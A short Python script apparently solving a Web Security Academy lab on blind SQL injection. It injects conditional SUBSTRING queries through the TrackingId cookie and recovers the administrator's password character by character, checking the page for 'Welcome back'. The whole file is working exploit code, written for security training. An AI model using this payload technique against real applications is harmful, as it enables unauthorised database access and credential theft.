# Lab: Blind SQL injection with conditional responses
import requests, string

URL = "https://0a9500b8032092f9801a0d8900a70034.web-security-academy.net/login"
TID = "Lk689r5Kqx8U1TS9"    #TID = TrackingId
SESSION = "6HDF8IhpdyvQXBQAFznDqxanUBm06it6"
CHARSET = string.ascii_lowercase + string.digits

def is_true(payload):
    r = requests.get(URL, cookies={"TrackingId": payload, "session": SESSION})
    return "Welcome back" in r.text

def extract_password(length=20):
    password = ""
    for pos in range(1, length + 1):
        for ch in CHARSET:
            payload = (f"{TID}' AND (SELECT SUBSTRING(password,{pos},1) "
                       f"FROM users WHERE username='administrator')='{ch}")
            if is_true(payload):
                password += ch
                print(f"[{pos}] {ch} -> {password}")
                break
    return password

print("password:", extract_password())